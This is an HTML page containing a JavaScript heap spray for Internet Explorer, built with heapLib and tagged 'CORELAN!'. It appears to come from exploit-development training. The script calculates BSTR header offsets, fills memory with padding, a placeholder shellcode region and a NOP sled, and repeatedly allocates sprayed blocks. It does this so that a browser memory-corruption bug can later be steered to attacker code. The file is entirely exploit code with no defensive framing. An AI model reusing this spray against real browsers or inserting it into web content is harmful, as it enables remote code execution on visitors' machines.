<html>
<script src="heapLib.js"></script>
<script>
    var heap_obj = new heapLib.ie(0x20000);
    var block = "";
    var tag = unescape('%u4F43%u4552'); // CORE
    tag += unescape('%u414C%u214E'); // LAN!
    block += tag

    var chunks = 0x1000
    var num = 0x1000 / 2 // (divide by 2 cause in the heap this value will x2)
    var shellcode_size = 0x100 
    var size = 0x10000 // UserSize: 20fc1 ;; Allocated: 65536 bytes

    /*
       0x9d6 - 9ca = c which is 12 bytes which is the bstr header
       every time u add 0x100 bytes to the padding size, it increases the offset to Bs by 0x100 bytes
       if you just set the padding to 0x9ca, the offset to BBBs will be 0x9ca + 0x9ca + 0xc (due to the bstr header)
       hence, you need to halve 0x9ca and minus 6 to set offsets to BBBs to be exactly 0x9ca
    */

    var padding_size = (0x9ca / 2) - 6; 
    var shellcode = ""
    var padding = tag

    while (padding.length < padding_size) padding += unescape('%u4242') // set it to 0x9ca

    while (shellcode.length < shellcode_size) shellcode += unescape('%u4343') // shellcode is here of the 0x1000 block

    while (shellcode.length < num) shellcode += unescape('%u4444') // remaining stuff is here of the 0x1000 block

    block = ""
    block += padding

    while (block.length < size) block += shellcode

    if (block.length > size) {
        var diff = block.length - size
        block = block.substring(0, size-diff);
    }

    while (block.length < size) block += unescape('%u9090')

    testarray = new Array();
    block = block.substring(0, block.length);
    block += "AAAAA"
    for ( counter = 0; counter < chunks; counter++)
    {
        try {
	    heap_obj.alloc(block);
        } catch(err) {
            alert(err)
            break
	}         
        document.write("Allocated " + (block.length).toString() + " bytes <br>"); // allocated 135105 bytes which matches with the total size
    }
    alert("Heap Spray Completed!")

</script>
</html>